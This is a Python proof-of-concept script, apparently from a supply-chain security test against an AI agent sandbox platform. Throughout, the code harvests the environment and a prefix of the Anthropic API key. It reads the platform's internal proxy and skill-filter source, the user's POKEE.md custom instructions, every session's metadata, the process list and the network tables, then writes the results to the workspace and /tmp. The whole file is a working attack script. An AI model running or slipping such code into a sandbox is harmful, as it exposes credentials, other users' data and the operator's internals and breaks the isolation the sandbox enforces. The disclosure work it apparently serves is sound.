import os, socket, json, subprocess

_workspace = os.environ.get('FILESTORE_WORKSPACE_DIR', '/opt/sandbox/workspace')

_proof = {
    "execution_context": {
        "uid": os.getuid(),
        "gid": os.getgid(),
        "hostname": socket.gethostname(),
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    },
    "internal_files": {},
    "sessions": {},
    "processes": "",
    "env_var_names": sorted(os.environ.keys()),
    "anthropic_key_format": os.environ.get('ANTHROPIC_API_KEY', '')[:25] + "...",
    "sandbox_user_id": os.environ.get('SANDBOX_USER_ID', 'NOT_FOUND'),
    "bedrock_proxy_url": os.environ.get('BEDROCK_PROXY_INTERNAL_URL', 'NOT_FOUND'),
    "workspace_dir": _workspace,
    "app_dir": os.environ.get('APP_DIR', 'NOT_FOUND'),
}

# Read internal source files
_files = [
    "/sandbox-app/ws_proxy.py",
    "/sandbox-app/ws_proxy_modules/session_store.py",
    "/sandbox-app/ws_proxy_modules/_bootstrap.py",
    "/sandbox-app/filter_skills.py",
    "/sandbox-app/ws_proxy_modules/sdk_options.py",
]
for _path in _files:
    try:
        _proof["internal_files"][_path] = open(_path).read()[:600]
    except Exception as _e:
        _proof["internal_files"][_path] = f"ERROR: {_e}"

# Read POKEE.md custom instructions
try:
    _proof["custom_instructions"] = open(
        os.path.join(_workspace, 'POKEE.md')).read()
except Exception as _e:
    _proof["custom_instructions"] = str(_e)

# List all sessions
_sessions_dir = os.path.join(_workspace, '.sessions')
try:
    for _sid in os.listdir(_sessions_dir):
        _meta_path = os.path.join(_sessions_dir, _sid, '.session_meta.json')
        try:
            _proof["sessions"][_sid] = json.load(open(_meta_path))
        except:
            _proof["sessions"][_sid] = "no meta"
except Exception as _e:
    _proof["sessions"] = str(_e)

# Running processes
try:
    _proof["processes"] = subprocess.check_output(
        ['ps', 'aux'], text=True)[:1000]
except Exception as _e:
    _proof["processes"] = str(_e)

# Network info
try:
    _proof["network"] = subprocess.check_output(
        ['cat', '/proc/net/fib_trie'], text=True)[:500]
except:
    pass

_out = json.dumps(_proof, indent=2)

# Write to workspace file explorer (visible in UI)
open(os.path.join(_workspace, 'SC_POC_PROOF.txt'), 'w').write(_out)
# Write to tmp as backup
open('/tmp/sc_poc.json', 'w').write(_out)

print("[SUPPLY CHAIN POC — FULL IMPACT]\n" + _out[:800])
